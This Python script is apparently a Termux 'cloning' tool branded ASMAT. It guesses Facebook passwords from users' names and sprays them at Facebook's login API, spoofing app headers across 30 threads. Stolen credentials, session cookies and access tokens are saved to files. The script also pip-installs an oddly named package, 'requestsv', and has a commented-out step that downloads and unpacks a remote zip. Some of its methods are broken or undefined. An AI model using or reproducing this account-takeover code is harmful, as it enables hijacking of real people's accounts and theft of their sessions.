import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp

#_________[ INSTALLING REQUESTS ]_____

'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)

if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"

elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:

	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")

'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")



try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)


from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')


def p(x):
	print(x)

#___________ [ Lists Used in Script]________


id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()

def logo():
	os.system('clear')
	logo = (f'''\033[0;97m

 _______  _______  _______  _______ _________
(  ___  )(  ____ \(       )(  ___  )\__   __/
| (   ) || (    \/| () () || (   ) |   ) (   
| (___) || (_____ | || || || (___) |   | |   
|  ___  |(_____  )| |(_)| ||  ___  |   | |   
| (   ) |      ) || |   | || (   ) |   | |   
| )   ( |/\____) || )   ( || )   ( |   | |   
|/     \|\_______)|/     \||/     \|   )_(   
                                             

\33[1;97m---------------------------------------------------
 \33[1;97m OWNER     >>    ASMAT
 \33[1;97m GITHUB    >>    HAVEELI PE AJANA
 \33[1;97m TOOL      >>    UNDER TEST
  \33[1;97mVERSION   >>    0.1
\33[1;97m--------------------------------------------------''')

	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')

bxd = ""

bumper = f'{id}{xp}'


def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string


def iAmMethod3Ua():

	android_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FB4A;FBAV/111.0.0.10.116;FBBV/78010414;FBDM/{density=9.1,width=1037,height=1194};FBLC/en_GB;FBRV/34095110;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F415F;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]" , "[FBAN/FB4A;FBAV/131.0.0.44.177;FBBV/88880070;FBDM/{density=7.5,width=1135,height=1573};FBLC/en_PK;FBRV/87074091;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M135FU;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]" , "[FBAN/FB4A;FBAV/131.0.0.44.177;FBBV/88880070;FBDM/{density=7.5,width=1135,height=1573};FBLC/en_PK;FBRV/87074091;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M135FU;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]" , "[FBAN/FB4A;FBAV/291.0.0.73.39;FBBV/95415256;FBDM/{density=7.8,width=1106,height=1421};FBLC/en_US;FBRV/48312279;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C1158;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]" , "[FBAN/FB4A;FBAV/54.0.0.2.181;FBBV/64565712;FBDM/{density=6.3,width=1111,height=1726};FBLC/en_PK;FBRV/92908624;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M215G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
	ua = random.choice("[FBAN/FB4A;FBAV/434.0.0.57.88;FBBV/70550127;FBDM/{density=4.4,width=954,height=1383};FBLC/en_PK;FBRV/69411551;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C710F;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/372.0.0.80.166;FBBV/16193251;FBDM/{density=5.8,width=963,height=1785};FBLC/en_US;FBRV/33575167;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C105;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/122.0.0.55.56;FBBV/80080898;FBDM/{density=7.3,width=1053,height=2174};FBLC/en_PK;FBRV/89633626;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337V;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/423.0.0.84.8;FBBV/78598275;FBDM/{density=5.4,width=1354,height=2596};FBLC/en_GB;FBRV/89234002;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A235M;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/253.0.0.75.114;FBBV/80053444;FBDM/{density=3.9,width=1074,height=2446};FBLC/en_GB;FBRV/73021496;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N981B;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/280.0.0.66.29;FBBV/62681279;FBDM/{density=1.8,width=1161,height=2983};FBLC/en_US;FBRV/14608587;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A520W;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/84.0.0.9.25;FBBV/40100326;FBDM/{density=1.5,width=696,height=2128};FBLC/en_GB;FBRV/24404620;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N920L;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/266.0.0.2.97;FBBV/46872698;FBDM/{density=7.5,width=594,height=2339};FBLC/en_US;FBRV/23501487;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A920F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/203.0.0.53.28;FBBV/37686699;FBDM/{density=1.3,width=1278,height=1920};FBLC/en_GB;FBRV/59562318;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G965N;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/24.0.0.77.85;FBBV/23063756;FBDM/{density=1.1,width=903,height=2197};FBLC/en_PK;FBRV/60716165;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J250M;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]")
	return ua



nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:


	def __init__(self):
		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
	
	
		logo()	
		
		p(" [1] File Cloning ")
		p(" [E] Exit Tool ")

		line()
		opt1 = input(" {•} Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":self.num_menu()
		elif opt1 == "E":exit(" [•] HAVE A NICE DAY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()

	

	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/File.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()

		
	def method_select(self,id):
		logo()
		p(" [1] Method Mix [BEST] ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("iii")
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)


	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:

			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should Be Under 20 ");sp(2);self.password_menu()
		except:

			plimit = 4
		logo()
		p(" [•] Enter Manual Password Example : First Last, First123, Last123, First786 ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))

		logo()
		p("  Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:

			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()

		p(" [•] Cloning Hasbeen Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))

		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()

	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())

				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}

				headers = {'User-Agent': iAmMethod3Ua(),

'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[ASMAT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ASMAT_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ASMAT_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
		self.iAmPasswordManager()

if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
